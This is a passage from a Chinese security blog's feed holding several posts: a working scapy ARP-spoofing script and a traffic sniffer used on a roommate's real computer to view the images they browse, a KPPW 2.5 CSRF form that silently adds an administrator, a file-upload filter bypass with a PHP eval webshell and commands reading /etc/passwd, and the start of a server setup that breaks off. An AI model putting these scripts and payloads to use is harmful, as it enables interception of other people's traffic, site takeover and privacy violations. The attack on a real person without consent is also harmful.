alt="mark"><br><strong>其中op段代表操作类型，当op为1代表发起arp请求，说明这是一个arp请求包，当op为2时代表发起arp响应，说明这是一个arp响应包，现在假设局域网的一台机器要上外网（比如百度），首先要与网关进行通讯，获取网关的物理地址后才能传送数据通过网关访问外网，这台机器会首先查看自己电脑的arp缓存表（缓存时间为120s）中是否有网关的物理地址，如果没有便会向局域网内的机器以广播的形式发送arp请求包询问网管的物理地址，请求包主要字段如下</strong></p><pre><code>op:1(op值为1说明这是一次arp请求)hwsrc：发送方MAC地址（即本机器MAC地址）psrc：发送方ip地址（即本机内网ip地址）hwdst：目标MAC地址（在这里为未知00：00：00：00：00：00）pdst：目标ip地址（即网关ip地址，一般为192.168.0.1/192.168.1.1）</code></pre><p><strong>局域网内所有机器接收此arp请求，如果发现请求的ip为自己的ip便会向请求机器发送arp响应，将自己的MAC地址带入arp响应包单播发送给请求的机器，arp响应包主要字段如下</strong></p><pre><code>op:2(op值为2说明这是一次arp响应)hwsrc：发送方MAC地址（即网关MAC地址）psrc：发送方ip地址（即网关ip地址）hwdst：目标MAC地址（为发起arp请求的机器的MAC地址）pdst：目标ip地址（为发起arp请求的机器的ip地址）</code></pre><p><strong>这样发起arp请求的机器从arp响应包里获取MAC地址并添加到本机arp缓存中，与网关进行通信，在这里要注意一点，在本机向网关发送arp请求的同时，网关也会向本机发送arp请求获取本机MAC地址，同时本机也会向网关发送arp响应，这时一个双向的过程，这里不再重复</strong></p><p><strong>接下来为了更清楚的理解，用wireshark抓包来观察一下arp请求包和响应包</strong></p><p><strong>选择抓包的网卡接口，在这选择wlan0，并向网关发起ping请求与网关通信，本机ip为192.168.0.106，网关ip为192.168.0.1</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/1GLmkkH2Ai.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/k2IclB0dDa.PNG" alt="mark"><br><strong>在过滤窗口输入arp&amp;&amp;ip.addr==192.168.0.1将arp数据包过滤出来</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/h94m4kFC49.png?imageslim" alt="mark"><br><strong>观察arp请求包和响应包是否和上述描述的一致，图中做出了详细标明</strong></p><p><strong>arp请求包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/6b1bI0Heb0.png?imageslim" alt="mark"><br><strong>arp响应包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/EIckd61cHh.png?imageslim" alt="mark"></p><h3 id="arp欺骗"><a href="#arp欺骗" class="headerlink" title="arp欺骗"></a>arp欺骗</h3><p><strong>上面描述完了arp协议，下面来说一下arp欺骗攻击，假设局域网内有三台机器</strong></p><pre><code>网关:192.168.0.1受害者机器：192.168.0.108本机kali：192.168.0.106</code></pre><p><strong>正常情况下，如果受害者和网关要进行通信，首先要使用arp协议进行对方的MAC地址获取，但是如果攻击者不断的向受害者发送arp响应包，告诉受害者网关的MAC地址为自己的MAC地址，包的大致内容如下</strong></p><pre><code>op:2(op值为2说明这是一次arp响应)hwsrc：发送方MAC地址（攻击者MAC地址）psrc：发送方ip地址（网关ip地址）hwdst：目标MAC地址（受害者MAC地址）pdst：目标ip地址（受害者ip地址）</code></pre><p><strong>在这里发送方ip是网关的ip，但是发送方MAC已经变为了攻击者（kali）的MAC地址，受害者不断的接收这个arp响应包，便会在自己的arp缓存中不断的更新错误的ip与MAC的对应关系，及网关的MAC为攻击者的MAC，由此攻击者的网卡便可以捕获到受害者到网关之间的流量，到现在实现了arp断网，受害者因为与错误的MAC地址进行通讯而上不了网，如果攻击者的机器开启了ip转发，便可以将从受害者截取到的流量转发出去给网关，实现arp欺骗，也称为中间人攻击</strong></p><p><strong>arp欺骗一般是双向欺骗，我们通过arp欺骗可以捕获到受害者到网关的流量，同样的我们可以向网关发送arp响应包欺骗网关受害者的MAC地址为自己的MAC地址，截获网关到受害者之间的流量，arp响应包大致如下</strong></p><pre><code>op:2(op值为2说明这是一次arp响应)hwsrc：发送方MAC地址（攻击者MAC地址）psrc：发送方ip地址（受害者ip地址）hwdst：目标MAC地址（网关MAC地址）pdst：目标ip地址（网关ip地址）</code></pre><p><strong>同样的网关在不断接受到此arp响应时也会不断的更新自己的arp缓存去建立错误的关系，我们的kali攻击机便可以双向的截获流量</strong></p><h3 id="用python实现arp攻击"><a href="#用python实现arp攻击" class="headerlink" title="用python实现arp攻击"></a>用python实现arp攻击</h3><p><strong>所需的python第三方库</strong></p><p><strong>scapy库：scapy是一个可用于网络嗅探的非常强大的第三方库。可以伪造，嗅探或发送网络数据包，这这里我们使用scapy库伪造arp响应包并发送,首先安装scapy库，kali默认自带</strong></p><pre><code>pip install scapy</code></pre><p><strong>模拟攻击环境,一个真实的局域网，就是我们寝室</strong></p><pre><code>自己的kali攻击机:192.168.0.106,装在vm虚拟机中，连接了RT3070型号的无线网卡室友的电脑:192.168.0.108，连接同一路由器的无线网网关：192.168.0.1</code></pre><p><strong>编写python代码：arpattack.py</strong></p><pre><code>from scapy.all import *#导入scapy模块from optparse import OptionParser#导入命令行参数处理模块optparseimport sysdef main():    usage=&quot;Usage: [-i interface] [-t targetip] [-g gatewayip]&quot;    parser=OptionParser(usage)    parser.add_option(&apos;-i&apos;,dest=&apos;interface&apos;,help=&apos;select interface(input eth0 or wlan0 or more)&apos;)#-i 所选择的网卡，eth0或wlan0，存放在interface变量中    parser.add_option(&apos;-t&apos;,dest=&apos;targetip&apos;,help=&apos;select ip to spoof&apos;)#-t 要攻击的ip，存放在targetip变量中    parser.add_option(&apos;-g&apos;,dest=&apos;gatewayip&apos;,help=&apos;input gateway ip&apos;)#-g 网关ip，存放在gatewayip变量中    (options,args)=parser.parse_args()    if options.interface and options.targetip and options.gatewayip:        interface=options.interface        tip=options.targetip        gip=options.gatewayip        spoof(interface,tip,gip)#将参数传给spoof函数    else:        parser.print_help()#显示帮助        sys.exit(0)def spoof(interface,tip,gip):#获取命令行的输入实现arp攻击    localmac=get_if_hwaddr(interface)#get_if_hwaddr获取本地网卡MAC地址    tmac=getmacbyip(tip)#根据目标ip获取其MAC地址    gmac=getmacbyip(gip)#根据网关ip获取其MAC地址    ptarget=Ether(src=localmac,dst=tmac)/ARP(hwsrc=localmac,psrc=gip,hwdst=tmac,pdst=tip,op=2)#构造arp响应包，欺骗目标机器网关的MAC地址为本机MAC地址    pgateway=Ether(src=localmac,dst=gmac)/ARP(hwsrc=localmac,psrc=tip,hwdst=gmac,pdst=gip,op=2)#构造arp响应包，欺骗网关目标机器的MAC地址为本机MAC地址    try:        while 1:            sendp(ptarget,inter=2,iface=interface)            print &quot;send arp reponse to target(%s),gateway(%s) macaddress is %s&quot;%(tip,gip,localmac)            sendp(pgateway,inter=2,iface=interface)            print &quot;send arp reponse to gateway(%s),target(%s) macaddress is %s&quot;%(gip,tip,localmac)#不断发送arp响应包欺骗目标机器和网关，直到ctrl+c结束程序    except KeyboardInterrupt:        sys.exit(0)if __name__==&apos;__main__&apos;:    main()</code></pre><p><strong>脚本使用到的scapy库中的几个函数</strong></p><pre><code>get_if_hwaddr(&quot;本地网卡名称（eth0/wlan0）&quot;)    根据所选择的本地网卡获取相应的本地网卡的MAC地址</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180114/JgBhi3KHgJ.PNG" alt="mark"></p><pre><code>getmacbyip（&quot;ip地址&quot;）    根据ip地址获取其MAC地址，使用该函数实际上使用了一次arp协议，可以用此函数获取网关和目标的MAC地址</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180114/KLm017GgK4.PNG" alt="mark"><br>    ARP是构建ARP数据包的类，Ether用来构建以太网数据包，构造arp数据包并加上以太网头部</p><pre><code>Ether(src=本地网卡MAC,dst=目标机器MAC)/ARP(hwsrc=本地网卡MAC,psrc=网关ip,hwdst=目标机器MAC,pdst=目标机器ip,op=2)构造发送给目标机器的arp数据包，并加上以太网头部，欺骗目标机器网关的MAC为本机的MACEther(src=本地网卡MAC,dst=网关MAC)/ARP(hwsrc=本地网卡MAC,psrc=网关ip,hwdst=网关MAC,pdst=网关ip,op=2)构造发送给网关的arp数据包，并加上以太网头部，欺骗网关目标机器的MAC为本机的MACsendp函数发送我们构造的arp数据包    sendp(数据包, inter=2, iface=网卡)    sendp函数工作在网络的第二层</code></pre><p><strong>以上代码实现了类似于arpspoof工具的功能，使用方法，进入脚本目录，输入</strong></p><pre><code>python arpattack.py -h</code></pre><p><strong>查看脚本使用帮助</strong></p><pre><code>Usage: [-i interface] [-t targetip] [-g gatewayip]Options:    -h, --help    show this help message and exit    -i INTERFACE  select interface(input eth0 or wlan0 or more)    -t TARGETIP   select ip to spoof    -g GATEWAYIP  input gateway ip</code></pre><p><strong>所以我们这样输入可以双向的欺骗网关和目标机器完中间人攻击</strong></p><pre><code>python arpattack.py -i 网卡 -t 要攻击的目标的ip地址 -g 网关ip</code></pre><p><strong>输入</strong></p><pre><code>python arpattack.py -i wlan0 -t 192.168.0.8 -g 192.168.0.1</code></pre><p><strong>选择无线网卡wlan0的MAC地址去欺骗室友的电脑和网关路由器，如果我和室友都插了网线，就要选择eth0</strong></p><p><strong>运行脚本便会不断的向室友的电脑和网关发送arp响应包进行双向欺骗，效果如下</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180114/fg0BD08D09.PNG" alt="mark"><br><strong>室友电脑arp缓存</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180116/I4CghAgijh.jpg?imageslim" alt="mark"><br><strong>路由器arp缓存</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180114/BDFcg2j7ED.png?imageslim" alt="mark"><br><strong>这时我们截获了室友电脑和网关之间的流量，使其不能相互通信，完成了arp断网</strong></p><pre><code>echo &quot;1&quot;&gt;/proc/sys/net/ipv4/ip_forward</code></pre><p><strong>开启流量转发，这时室友和网关正常通讯，但是流量会经过我们的网卡</strong></p><p><strong>接下来用python编写代码查看室友电脑浏览的网页图片，其实不难，因为浏览图片一般都是向服务器发送一次请求图片的http请求，所以只需从经过我们网卡的流量中过滤tcp80端口的数据包（http协议），将数据包的头部层层去掉，最后便能得到应用层的http数据包，在利用正则表达式将<code>http://*.jpg</code>筛选出来即可知道室友请求了哪些图片，python的pcap库和dpkt库可以使我们很容易的得到电脑网卡流量中的http应用层数据包</strong></p><pre><code>apt-get install libpcap-devpip install pypcappip install dpkt</code></pre><p><strong>安装pcap库和dpkt库</strong></p><p><strong>pcap模块的pcap方法可以返回一个用来捕获网卡数据包的pcap对象</strong></p><p><strong>dpkt，一个数据包解析工具，可以解析离线/实时pcap数据包</strong></p><p><strong>python代码如下stealimg.py</strong></p><pre><code>import pcapimport dpktimport reimport requestsfrom PIL import Imagefrom io import BytesIOfrom optparse import OptionParserimport sysurllist=[]def main():    usage=&quot;Usage: [-i interface]&quot;    parser=OptionParser(usage)    parser.add_option(&apos;-i&apos;,dest=&apos;interface&apos;,help=&apos;select interface(input eth0 or wlan0 or more)&apos;)    (options,args)=parser.parse_args()    if options.interface:        interface=options.interface        pc=pcap.pcap(interface)        pc.setfilter(&apos;tcp port 80&apos;)        for ptime,pdata in pc:            getimg(pdata)    else:        parser.print_help()        sys.exit(0)def getimg(pdata):    global urllist    p=dpkt.ethernet.Ethernet(pdata)    if p.data.__class__.__name__==&apos;IP&apos;:        if p.data.data.__class__.__name__==&apos;TCP&apos;:            if p.data.data.dport==80:                pa=re.compile(r&apos;GET (.*?\.jpg)&apos;)#|.*?\.png|.*?\.gif                img=re.findall(pa,p.data.data.data)                if img!=[]:                    lines=p.data.data.data.split(&apos;\n&apos;)                    for line in lines:                        if &apos;Host:&apos; in line:                            url=&apos;http://&apos;+line.split(&apos;:&apos;)[-1].strip()+img[-1]                            if url not in urllist:                                urllist.append(url)                                if &apos;Referer:&apos; in p.data.data.data:                                    for line in lines:                                        if &apos;Referer:&apos; in line:                                            referer=line.split(&apos;:&apos;)[-1].strip()                                            print url                                            r=requests.get(url,headers={&apos;Referer&apos;:referer})                                            img=Image.open(BytesIO(r.content))                                            img.show()                                else:                                    r=requests.get(url)                                    img=Image.open(BytesIO(r.content))                                    img.show()                            else:                                passif __name__==&apos;__main__&apos;:    main()  </code></pre><p><strong>代码将pcap从本机网卡捕获到的完整的网络数据包使用dpkt库将其中封装的http应用层数据包提取出来，通过正则表达式将请求图片的http请求过滤出来，并在本机请求并输出，完成窥屏，效果如下</strong></p><p><strong>室友电脑浏览图片</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180116/lE1kD92EB0.jpg?imageslim" alt="mark"><br><strong>自己kali可以窥屏</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180116/kI9l6IkGka.jpg?imageslim" alt="mark"></p><p><strong>注意一点，百度的图片爬取要在http请求头中加上Referer字段，否则会出现403禁止访问，代码只是简单的实现了窥屏的效果，还有着很多不足，不过通过这次学习可以对arp欺骗攻击有更深的理解</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;arp协议分析-amp-python编程实现arp欺骗抓图片&quot;&gt;&lt;a href=&quot;#arp协议分析-amp-python编程实现arp欺骗抓图片&quot; class=&quot;headerlink&quot; title=&quot;arp协议分析&amp;amp;python编程实现arp欺骗抓图片&quot;&gt;
      
    
    </summary>
    
      <category term="无线安全" scheme="http://yoursite.com/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="python黑客编程" scheme="http://yoursite.com/tags/python%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>KPPW2.5XSS引起的CSRF</title>
    <link href="http://yoursite.com/2018/01/12/KPPW25xss/"/>
    <id>http://yoursite.com/2018/01/12/KPPW25xss/</id>
    <published>2018-01-12T01:45:22.454Z</published>
    <updated>2018-01-12T02:19:43.669Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kppw2-5XSS漏洞复现（可csrf）"><a href="#kppw2-5XSS漏洞复现（可csrf）" class="headerlink" title="kppw2.5XSS漏洞复现（可csrf）"></a>kppw2.5XSS漏洞复现（可csrf）</h1><h3 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><pre><code>http://192.168.50.157/kppw25/index.php?do=user&amp;view=message&amp;op=send</code></pre><p><strong>收件人填目标用户名,标题随便,内容没有转义 ,所以提交内容处可能存在xss，不过过滤了敏感标签和 onerror onload等事件。虽然不能加载js代码，但是还是可以注入html代码，可以用xss漏洞注入html代码触发csrf</strong></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><pre><code>http://192.168.50.157/kppw25/index.php?do=user&amp;view=message&amp;op=send</code></pre><p><strong>收件人填写admin（网站管理员），向管理员提交私信，内容为我们构造的html代码</strong></p><pre><code>&lt;form action=&quot;http://192.168.50.157/kppw25/admin/index.php?do=user&amp;view=add&amp;edituid=&quot; method=&quot;post&quot;&gt;    &lt;input type=hidden name=&quot;edituid&quot; value=&quot;&quot;&gt;    &lt;input type=hidden name=&quot;fds[username]&quot; value=&quot;qianlan&quot;&gt;    &lt;input type=hidden name=&quot;fds[truename]&quot; value=&quot;&quot;&gt;    &lt;input type=hidden name=&quot;fds[phone]&quot; value=&quot;&quot;&gt;    &lt;input type=hidden name=&quot;fds[qq]&quot; value=&quot;&quot;&gt;    &lt;input type=hidden name=&quot;fds[indus_pid]&quot; value=&quot;&quot;&gt;    &lt;input type=hidden name=&quot;fds[indus_id]&quot; value=&quot;&quot;&gt;    &lt;input type=hidden name=&quot;fds[birthday]&quot; value=&quot;&quot;&gt;    &lt;input type=hidden name=&quot;fds[password]&quot; value=&quot;newadmin&quot;&gt;    &lt;input type=hidden name=&quot;fds[email]&quot; value=&quot;x@q.c&quot;&gt;    &lt;input type=hidden name=&quot;fds[group_id]&quot; value=&quot;1&quot;&gt;    &lt;input type=&quot;submit&quot; name=&quot;is_submit&quot; value=&quot;1&quot;&gt;&lt;/form&gt;</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/61IildflAL.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/0l5K9ahhlI.PNG" alt="mark"><br><strong><code>http://192.168.50.157/kppw25/admin/index.php?do=user&amp;view=add&amp;edituid=</code>这个url是后台管理员添加用户的url，我们构造表单，action的值设为这个url，写几个隐藏表单诱使管理员去点击提交，就会以管理员的身份去添加一个新的管理员，当然这不是网站管理员的意愿，而是我们的</strong></p><p><strong>提交完成后退出当前网站用户，模拟管理员登陆查看私信，可以看到一个按钮，单单一个按钮，看到的人总会想着去点一下，当然这个按钮可以构造的更具有吸引力</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/76hH05ID8e.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/b3m8d2K1fC.PNG" alt="mark"><br><strong>当点击按钮过后，管理员就会在不知情的情况下发起添加用户的http请求去添加一个用户名为qianlan密码为newadmin的用户，当然这是我们构造的，看用户列表可以看到多了一个名为qianlan的用户，我们登陆一下可以成功进入后台，进行下一步的渗透</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/1gdjJ8kgAd.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/K4e1kIgCJc.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/cKa291JeeF.PNG" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;kppw2-5XSS漏洞复现（可csrf）&quot;&gt;&lt;a href=&quot;#kppw2-5XSS漏洞复现（可csrf）&quot; class=&quot;headerlink&quot; title=&quot;kppw2.5XSS漏洞复现（可csrf）&quot;&gt;&lt;/a&gt;kppw2.5XSS漏洞复现（可csrf）&lt;/
      
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="漏洞利用" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>KPPW2.5文件上传导致远程代码执行</title>
    <link href="http://yoursite.com/2018/01/11/KPPW25fileupload/"/>
    <id>http://yoursite.com/2018/01/11/KPPW25fileupload/</id>
    <published>2018-01-11T15:01:49.014Z</published>
    <updated>2018-01-11T17:11:06.132Z</updated>
    
    <content type="html"><![CDATA[<h1 id="KPPW2-7文件上传导致远程代码执行漏洞复现"><a href="#KPPW2-7文件上传导致远程代码执行漏洞复现" class="headerlink" title="KPPW2.7文件上传导致远程代码执行漏洞复现"></a>KPPW2.7文件上传导致远程代码执行漏洞复现</h1><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p><strong>和上一节的一样，同样是kpww2.5版本，此版本存在文件上传漏洞，攻击者可以上传php一句话木马拿下webshell</strong></p><p>###上传点###<br><strong>漏洞分析</strong></p><p><strong>在control/ajax/upload.php中：</strong></p><pre><code>$pathDir = setUploadPath($fileType, $objType);$upload = new keke_upload_class(S_ROOT.$pathDir ,$fileFormat,$maxSize);$savename = $upload-&gt;run( $filename , 1);</code></pre><p><strong>再来看run方法：</strong></p><pre><code>function run($fileInput, $randName = 1) {        if (isset ( $_FILES [$fileInput] )) {            $fileArr = $_FILES [$fileInput];            if (is_array ( $fileArr [&apos;name&apos;] )) {                 ....            }            else {                 $this-&gt;getExt ( $fileArr [&apos;name&apos;] );                 $this-&gt;setSavename ();                 if ($this-&gt;copyfile ( $fileArr, $randName )) {                     $this-&gt;returnArray [] = $this-&gt;returninfo;                } else {                    $this-&gt;returninfo [&apos;error&apos;] = $this-&gt;errmsg ();                    $this-&gt;returnArray [] = $this-&gt;returninfo;                }                return $this-&gt;errno ? $this-&gt;errmsg () : $this-&gt;returnArray;            }            return false;        }</code></pre><p><strong>在这段方法中，先是获取了$this-&gt;getExt ( $fileArr [‘name’] ); 文件后缀，这里没有什么问题，然后再生成上传后的随机名+后缀. 最后执行上传操作copyfile</strong></p><pre><code>function copyfile($fileArray, $randName) {        $this-&gt;returninfo = array ();        $this-&gt;returninfo [&apos;name&apos;] = $fileArray [&apos;name&apos;];        if ($randName) {            $this-&gt;returninfo [&apos;saveName&apos;] = $this-&gt;saveName;        } else {            $this-&gt;saveName = $this-&gt;returninfo [&apos;saveName&apos;] = $fileArray [&apos;name&apos;];        }        $this-&gt;returninfo [&apos;size&apos;] = $fileArray [&apos;size&apos;];         $this-&gt;returninfo [&apos;type&apos;] = $fileArray [&apos;type&apos;];        if (! $this-&gt;validateFormat ()) {            $this-&gt;errno = 11;            return false;        }        if(!$this-&gt;fileFilter($fileArray [&quot;tmp_name&quot;],$this-&gt;ext)){            $this-&gt;errno = 21;            return false;        }        if ($this-&gt;savePathFunc) {            $savePathFunc = $this-&gt;savePathFunc;            $this-&gt;savePath = $savePathFunc ( $this-&gt;saveName );            $this-&gt;returninfo [&apos;path&apos;] = $this-&gt;savePath;        }        $this-&gt;makeDirectory ( $this-&gt;savePath );        if (! @is_writable ( $this-&gt;savePath )) {            @mkdir ( $this-&gt;savePath, 0777, true );        }        if ($this-&gt;overwrite == 0 &amp;&amp; @file_exists ( $this-&gt;savePath . $this-&gt;saveName )) {            $this-&gt;errno = 13;            return false;        }        if ($this-&gt;maxSize != 0) {            if ($fileArray [&quot;size&quot;] &gt; $this-&gt;maxSize) {                $this-&gt;errno = 14;                return false;            }        }        if (! @copy ( $fileArray [&quot;tmp_name&quot;], $this-&gt;savePath . $this-&gt;saveName )) {            $this-&gt;errno = $fileArray [&quot;error&quot;];            return false;        }    }</code></pre><p><strong>这里先做了$this-&gt;validateFormat (),根据文件名来获取后缀，再判断后缀是否合法：</strong></p><pre><code>function validateFormat() {        if (! is_array ( $this-&gt;fileFormat ) || in_array ( strtolower ( $this-&gt;ext ), $this-&gt;fileFormat ) || in_array ( strtolower ( $this-&gt;returninfo [&apos;type&apos;] ), $this-&gt;fileFormat ))            return true;        else            return false;    }</code></pre><p><strong>关键看这个条件：<code>in_array ( strtolower ( $this-&gt;returninfo [&#39;type&#39;] ), $this-&gt;fileFormat )</code>,这里判断type是否合法而且用了或操作，等于这边为true了，整个if条件就为true了， 而这个type我们可以改动的，只要抓包把<code>Content-Disposition: form-data; name=&quot;name&quot;; filename=&quot;1.php&quot;Content-Type:</code> 中的Content-Type设置成我们想要的值就可以绕过了。绕过了这个地方以为后面就一帆风顺了，但是还是上传不上去，继续看下面的一个操作$this-&gt;fileFilter($fileArray [“tmp_name”],$this-&gt;ext）这个操作实际上是根据文件头来确定文件的后缀，再检测后缀与之前的文件名获取的后缀是否一致。 这本来是一个很好的过滤方法，但开发人员又写错了：</strong></p><pre><code>function fileFilter($path,$ext){        if(keke_file_class::get_file_type($path,$this-&gt;ext)==$ext){            return true;        }else{            return false;        }    }static function get_file_type($file_path, $ext = &apos;&apos;) {        $fp = fopen ( $file_path, &apos;r&apos; );        $bin = fread ( $fp, 2 );        fclose ( $fp );        $strInfo = @unpack ( &quot;C2chars&quot;, $bin );        $typeCode = intval ( $strInfo [&apos;chars1&apos;] . $strInfo [&apos;chars2&apos;] );        $fileType = &apos;unknown&apos;;        $typeCode == &apos;3780&apos; &amp;&amp; $fileType = &quot;pdf&quot;;        $typeCode == &apos;6787&apos; &amp;&amp; $fileType = &quot;swf&quot;;        $typeCode == &apos;7784&apos; &amp;&amp; $fileType = &quot;midi&quot;;        $typeCode == &apos;7790&apos; &amp;&amp; $fileType = &quot;exe&quot;;        $ext == &apos;txt&apos; &amp;&amp; $fileType = &quot;txt&quot;;        in_array ( $typeCode, array (&apos;8297&apos;, &apos;8075&apos; ) ) &amp;&amp; $fileType = $ext;         if (in_array ( $typeCode, array (&apos;255216&apos;, &apos;7173&apos;, &apos;6677&apos;, &apos;13780&apos; ) )) {             in_array ( $ext, array (&apos;jpg&apos;, &apos;gif&apos;, &apos;bmp&apos;, &apos;png&apos;, &apos;jpeg&apos; ) ) and $fileType = $ext or $fileType = &apos;jpg&apos;;        }        if ($typeCode == &apos;208207&apos;) {             in_array ( $ext, array (&apos;wps&apos;, &apos;ppt&apos;, &apos;dot&apos;, &apos;xls&apos;, &apos;doc&apos;, &apos;docx&apos; ) ) and $fileType = $ext or $fileType = &apos;doc&apos;;        }        return $fileType;    }</code></pre><p><strong>关键看这个操作：in_array ( $typeCode, array (‘8297’, ‘8075’ ) ) &amp;&amp; $fileType = $ext; 如果typecode 等于8297或者8075的时候，就会将filetype赋值为$ext,这样不就是饶过了之前的那个if判断。POC: 只需要将content-type 设置成jpg 再在上传的文件开头写上Ra 就可以成功绕过上传过滤。 （Ra 获取以后的code值就是8297）</strong><br><strong>漏洞利用，构造上传页面</strong></p><pre><code>&lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot; action=&quot;http://192.168.50.157/kppw25/index.php?do=ajax&amp;view=upload&amp;file_type=big&amp;filename=filename&quot;&gt;请选择文件： &lt;br&gt;&lt;input name=&quot;filename&quot; type=&quot;file&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; value=&quot;上传文件&quot;&gt;&lt;/form&gt;</code></pre><p><strong>攻击者可在本地上传php一句话木马</strong></p><pre><code>Ra&lt;?php @eval($_POST[&apos;lawliet&apos;]);?&gt;</code></pre><p><strong>点击上传文件后相当于向192.168.50.157发送了一次上传文件的http请求，用burp抓包，将content-type改为jpg即可上传成功并返回webshell地址</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/Amai76dbB6.PNG" alt="mark"><br><strong>访问webshell地址即可远程执行命令，比如<code>ifconfig</code>查看ip，<code>cat /etc/passwd</code>查看敏感文件</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/LEeEDH92h9.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/8Je556HiH8.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/bKCH5mBI8b.PNG" alt="mark"><br><strong>由于之前在安装的时候将kppw25目录下的文件降成了apache权限，所以导致有些root命令不能执行，比如<code>cat /etc/shadow</code>，所以就算攻击者真的拿下webshell也只是apache的权限，没有系统权限,除非利用系统漏洞提权为root</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;KPPW2-7文件上传导致远程代码执行漏洞复现&quot;&gt;&lt;a href=&quot;#KPPW2-7文件上传导致远程代码执行漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;KPPW2.7文件上传导致远程代码执行漏洞复现&quot;&gt;&lt;/a&gt;KPPW2.7文件上传导致远程代码
      
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="漏洞利用" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>KPPW2.5几处sql注入漏洞利用与exp编写</title>
    <link href="http://yoursite.com/2018/01/11/KPPW25sqli/"/>
    <id>http://yoursite.com/2018/01/11/KPPW25sqli/</id>
    <published>2018-01-11T06:10:02.466Z</published>
    <updated>2018-01-14T09:15:23.201Z</updated>
    
    <content type="html"><![CDATA[<h1 id="KPPW2-5版本几处sql注入漏洞利用以及exp编写"><a href="#KPPW2-5版本几处sql注入漏洞利用以及exp编写" class="headerlink" title="KPPW2.5版本几处sql注入漏洞利用以及exp编写"></a>KPPW2.5版本几处sql注入漏洞利用以及exp编写</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>老师布置的web安全课程设计，要求自己搭建环境利用漏洞渗透服务器，看到题目中有一个是KPPW，感觉这一个题目更具有实际性，于是自己选择了KPPW这个漏洞百出的开源web应用作为题目，这篇文章不再使用集成环境去搭建环境，而是在最小化安装的centos上一步步搭建渗透环境去测试，这篇文章先来研究KPPW2.5版本，其它的版本会写在另外的文章中</strong></p><h3 id="lamp环境搭建"><a href="#lamp环境搭建" class="headerlink" title="lamp环境搭建"></a>lamp环境搭建</h3><p><strong>下载centos6.4镜像，在虚拟机里最小化安装centos，安装服务器版</strong></p><p><strong>为了下载更方便，使用国内163镜像的源，更新源</strong></p><pre><code>yum -y install wgetmv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.163.com/.help/CentOS6-Base-163.repo</code></pre><p><strong>安装apache服务</strong></p><pre><code>yum -y install httpdservice httpd startservice iptables stop</code></pre><p><strong>在浏览器输入虚拟机ip测试是否安装成功，安装成功会显示apache的界面，注意这里要关闭iptables，不然会被防火墙禁止访问80端口</strong></p><p><strong>安装mysql服务</strong></p><pre><code>yum -y install mysql mysql-server mysql-develservice mysqld start</code></pre><p><strong>安装后进入mysql终端，默认密码为空，给mysql设置密码</strong></p><pre><code>mysql -u root -puse mysql;update user set Password=PASSWORD(&quot;root&quot;) where USER=&apos;root&apos;service mysqld restart</code></pre><p><strong>安装php和一些常用的php扩展，kppw的安装要求php-gd库的扩展，否则不能安装</strong></p><pre><code>yum -y install php php-mysqlyum search phpyum -y install gd php-gd gd-devel php-xml php-common php-mbstring php-ldap php-pear php-xmlrpc php-imap php-mysqliservice httpd restart</code></pre><h3 id="安装KPPW2-5"><a href="#安装KPPW2-5" class="headerlink" title="安装KPPW2.5"></a>安装KPPW2.5</h3><p><strong>用winSCP将kppw2.5的压缩包上传至centos并解压</strong></p><pre><code>cd /var/www/htmlmkdir kppw25yum -y install unzipcd kppw25unzip KPPW_GBK.zip</code></pre><p><strong>将kppw25以及其目录下的文件的用户及用户组改为apache，否则安装时会显示目录不可写</strong></p><pre><code>chown -R apache kppw25chgrp -R apache 